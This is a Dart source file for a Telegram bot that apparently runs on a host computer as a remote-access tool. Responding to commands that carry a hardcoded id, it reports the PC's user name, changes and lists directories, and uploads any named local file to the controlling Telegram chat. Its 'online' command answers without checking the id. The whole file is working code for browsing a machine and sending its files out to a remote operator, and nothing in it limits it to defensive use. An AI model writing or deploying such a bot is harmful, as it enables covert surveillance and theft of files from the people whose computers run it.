import 'package:teledart/teledart.dart';
import 'package:teledart/telegram.dart';
import 'dart:async';
import 'package:teledart/model.dart';
import 'dart:io';

import 'const.dart';
import 'download_upload.dart';
import 'traversal.dart';

class TeleBot extends Traverslar {
  var user = Downloader().userProfile;
  String my_id = '1120110';
  String myUser;
  var teledart = TeleDart(Telegram(telegramApi), Event());

  void initter() async {
    await teledart.start().then((me) => myUser = me.username);
    await teledart
        .onCommand(RegExp('cd', caseSensitive: false))
        .listen((message) async {
      List parm = message.text.split(' ');
      print(parm);
      if (parm.last.toString() == my_id) {
        var newPath = changeDir(path: parm[1].toString());
        print(newPath);
        print(parm);
        await teledart.telegram
            .sendMessage(message.chat.id, newPath.toString());
      }
    });
    await teledart
        .onCommand(RegExp('getPcUser', caseSensitive: false))
        .listen((message) async {
      List parm = message.text.split(' ');
      if (parm.last.toString() == my_id) {
        await teledart.telegram.sendMessage(message.chat.id, user);
      }
    });
    await teledart
        .onCommand(RegExp('getFile', caseSensitive: false))
        .listen((message) async {
      List parm = message.text.split(' ');
      if (parm.last.toString() == my_id && parm.length == 3) {
        await teledart.telegram.sendDocument(message.chat.id, getFile(parm[1]));
      }
    });
    await teledart
        .onCommand(RegExp('getcwd', caseSensitive: false))
        .listen((message) async {
      List parm = message.text.split(' ');
      if (parm.last.toString() == my_id) {
        await teledart.telegram
            .sendMessage(message.chat.id, getCurrentDir().toString());
      }
    });
    await teledart
        .onCommand(RegExp('online', caseSensitive: false))
        .listen((message) async {
      teledart.telegram
          .sendMessage(message.chat.id, user + '   ' + my_id.toString());
    });
    await teledart
        .onCommand(RegExp('getDir', caseSensitive: false))
        .listen((message) async {
      List parm = message.text.split(' ');
      if (parm.last.toString() == my_id && message.text.isNotEmpty) {
        await teledart.telegram.sendMessage(message.chat.id, getListFiles());
      }
    });
  }
}
